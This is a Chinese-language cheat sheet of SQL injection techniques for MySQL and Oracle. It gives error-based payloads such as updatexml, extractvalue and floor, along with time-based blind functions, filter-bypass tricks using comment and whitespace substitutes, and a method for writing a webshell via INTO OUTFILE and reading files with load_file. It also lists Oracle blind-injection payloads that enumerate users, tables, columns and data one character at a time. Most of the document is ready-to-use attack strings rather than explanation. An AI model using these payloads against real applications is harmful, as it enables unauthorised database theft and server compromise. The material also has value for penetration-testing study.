## 绕过逗号过滤
在使用盲注的时候，需要使用到substr(),mid(),limit.这些字句方法都需要使用到逗号。都与substr和mid()这两个方法，可以使用from for的方式来解决
## insert 注入
insert注入一般为时间盲注，本身不存在bool盲注。
## mysql报错函数
### 通用的报错函数
geometrycollection() //在mysql 5.6/mariadb 10.1中测试无报错  
multipoint()         //在mysql 5.6/mariadb 10.1中测试无报错  
polygon()            //在mysql 5.6/mariadb 10.1中测试无报错  
multipolygon()       //在mysql 5.6/mariadb 10.1中测试无报错  
linestring()         //在mysql 5.6/mariadb 10.1中测试无报错  
mulilinestring()     //在mysql 5.6/mariadb 10.1中测试无报错  
floor()              //可用，select * from test where id=1 and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)));
updatexml()          //可用，select * from test where 1 and updatexml(1,(select concat(0x7e,user())),1)
extractvalue()       //可用，select * from test where id =1 and extractvalue(1,(select concat(0x7e,user())));
exp()                //在mysql 5.6可用/mariadb 10.1中测试无报错，select * from test where i and exp(~(select * from(select user())a));
### mysql5.7以上才有的报错函数
ST_LatFromGeoHash()  
ST_LongFromGeoHash()  
GTID_SUBSET()  
ST_PointFromGeoHash()  
## mysql中字符串拼接函数
left(str,length)           //从字符串左侧截取str的前length位  
right(str,length)           //从字符串右侧截取  
mid(str,pos,len)          //从pos位置开始，截取字符串str的len长度  
substr(a,b,c)               //效果同mid  
substring(str,pos)         //从pos位置开始，截取到最后  
## mysql中基于时间的盲注函数
+ sleep  
+ banchmark  

## mysql写shell
+ select 'xxxx' into outfile '路径'  
+ select 'xxxx' into dumpfile '路径'  
mysql读文件：select load_file('路径');  

## mysql udf提权

## mysql一些技巧
'='被过滤，可以用like代替
' '被过滤，可以用`/**/`,`/*!12345from*/`,%0a,%0b,'+'来尝试绕过
','被过滤，可以用join来绕过


# Oracle

## 一些常用的payload
ASCII(SUBSTRC((SELECT NVL(CAST(COUNT(DISTINCT(OWNER)) AS VARCHAR(4000)),CHR(32)) FROM SYS.ALL_TABLES),1,1))>51
user
AND SUBSTR((SELECT USER FROM DUAL),1,1)='J'  // 当前用户
version
select banner from v$version(where rownum=1)   //rownum 理解为行号？一种伪列。根据返回记录生成序列化数字。
字段
SUBSTRC((SELECT NVL(CAST(COLUMN_NAME AS VARCHAR(4000)),CHR(32)) FROM (SELECT COLUMN_NAME,ROWNUM AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=CHR(65) AND OWNER=CHR(68)||CHR(79)||CHR(67)||CHR(85)||CHR(77)||CHR(69)||CHR(78)||CHR(84) ORDER BY 1 ASC) WHERE LIMIT=1),1,1))>64
表
6495 AND ASCII(SUBSTRC((SELECT NVL(CAST(TABLE_NAME AS VARCHAR(4000)),CHR(32)) FROM (SELECT TABLE_NAME,ROWNUM AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER=CHR(68)||CHR(79)||CHR(67)||CHR(85)||CHR(77)||CHR(69)||CHR(78)||CHR(84)) WHERE LIMIT=3),2,1))=85
库
6495 AND ASCII(SUBSTRC((SELECT NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32)) FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT=1),1,1))>68

数据
AND ASCII(SUBSTRC((SELECT NVL(CAST("YEAR" AS VARCHAR(4000)),CHR(32)) FROM (SELECT qq.*,ROWNUM AS LIMIT FROM DOCUMENT.A qq) WHERE LIMIT=1),4,1))>48

## 函数
* cast 转换列或值
```sql
select cast(user as varchar(4000))将user的类型转化为varchar型
select cast('123' as int)将字符串转化为整形
```
* NVL(arg,value) arg为true，则返回，否则返回value
```node
if(arg)
return arg
else
return value
``` 
* substr 同mysql中substr

* WHEN...THEN...
## 一些坑点
oracle中单引号中的为字符串，双引号中的为字段名，